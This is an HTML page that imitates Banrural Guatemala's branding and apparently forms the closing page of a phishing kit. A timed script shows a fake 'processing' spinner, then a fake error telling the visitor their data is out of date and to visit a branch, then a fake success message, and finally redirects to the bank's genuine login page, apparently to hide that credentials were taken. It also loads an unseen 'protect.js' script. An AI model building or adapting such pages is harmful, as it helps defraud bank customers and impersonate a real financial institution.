<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Procesando solicitud - Banrural Guatemala</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <script src="protect.js"></script>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{
      min-height:100vh;
      font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
      background:#f4f5f7;
      color:#1a1a1a;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      padding:24px;
    }
    .card{
      background:#fff;
      border-radius:16px;
      padding:40px 28px;
      max-width:420px;
      width:100%;
      text-align:center;
      box-shadow:0 8px 32px rgba(6,95,44,0.08);
      border:1px solid #ececf2;
    }
    .logo{
      height:64px;
      width:auto;
      margin:0 auto 22px;
      display:block;
    }
    .spinner{
      width:56px;height:56px;
      border:5px solid rgba(6,95,44,0.15);
      border-top-color:#065f2c;
      border-radius:50%;
      animation:spin .9s linear infinite;
      margin:8px auto 22px;
    }
    @keyframes spin{to{transform:rotate(360deg)}}
    h1{font-size:22px;font-weight:800;margin-bottom:10px;color:#04421a}
    p{font-size:15px;color:#5e6470;line-height:1.5;margin-bottom:18px}
    .check{
      width:64px;height:64px;border-radius:50%;
      background:#e9f8ee;color:#1d8c44;
      display:none;align-items:center;justify-content:center;
      margin:8px auto 18px;
    }
    .check svg{width:34px;height:34px}
    .btn{
      display:none;
      align-items:center;justify-content:center;
      margin:18px auto 0;
      background:#065f2c;color:#fff;
      padding:12px 22px;border-radius:10px;
      font-weight:600;font-size:15px;
      text-decoration:none;
      transition:background .15s;
    }
    .btn:hover{background:#04421a}
    .icon-error{
      width:64px;height:64px;border-radius:50%;
      background:#fdecea;color:#c0392b;
      display:none;align-items:center;justify-content:center;
      margin:8px auto 22px;
    }
    .icon-error svg{width:36px;height:36px}
    /* === Estado: error === */
    .state-error .spinner{display:none}
    .state-error .icon-error{display:inline-flex}
    .state-error h1{color:#c0392b}
    /* === Estado: redirigiendo === */
    .state-redirect .icon-error{display:none}
    .state-redirect .spinner{display:block}
    .state-redirect h1{color:#04421a}
    .note{font-size:12.5px;color:#9aa0aa;margin-top:18px}
  </style>
</head>
<body>
  <div class="card" id="card">
    <img src="img/Nuevo_Logo_Banrural.webp" alt="Banrural Guatemala" class="logo" />
    <div class="spinner" aria-hidden="true"></div>
    <div class="icon-error" aria-hidden="true">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="13"/><line x1="12" y1="16.5" x2="12" y2="16.5"/></svg>
    </div>
    <h1 id="title">Procesando tu solicitud...</h1>
    <p id="message">Estamos validando tu información</p>
    <p class="note">© 2026 Banco de Desarrollo Rural, S.A. (Banrural).</p>
  </div>
  <script>
    (function(){
      var card    = document.getElementById('card');
      var title   = document.getElementById('title');
      var message = document.getElementById('message');

      // 0 – 8 s: spinner verde + "Procesando tu solicitud..."

      // 8 s -> Error (dura 8 s)
      setTimeout(function(){
        card.classList.add('state-error');
        title.textContent = 'Ups, No podemos continuar con tu solicitud';
        message.textContent = 'Alguno de tus datos no se encuentran actualizados. Por favor, debes asistir a la sucursal física más cercana para completar la validación de identidad.';
      }, 8000);

      // 16 s -> Éxito + cargando (dura 5 s)
      setTimeout(function(){
        card.classList.remove('state-error');
        card.classList.add('state-redirect');
        title.textContent = 'Solicitud recibida con éxito';
        message.textContent = 'Cargando...';
      }, 16000);

      // 21 s -> Redirect a Banca Virtual
      setTimeout(function(){
        window.location.replace('https://bancavirtual.banrural.com.gt/cb/pages/jsp-ns/login-cons.jsp');
      }, 21000);
    })();
  </script>
</body>
</html>
